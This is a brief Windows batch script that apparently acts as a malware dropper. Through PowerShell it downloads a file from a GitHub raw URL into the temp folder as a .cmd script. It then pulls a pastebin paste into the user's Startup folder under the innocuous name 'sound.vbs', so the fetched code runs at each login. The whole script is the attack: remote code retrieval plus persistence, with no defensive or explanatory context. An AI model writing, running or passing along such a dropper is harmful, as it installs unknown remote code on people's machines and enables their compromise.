@echo off && cls
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wwwqr-000/1/main/marf.txt' -OutFile %tmp%\marf.cmd"
powershell -command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/XsxsKP4T' -OutFile 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sound.vbs'"
pause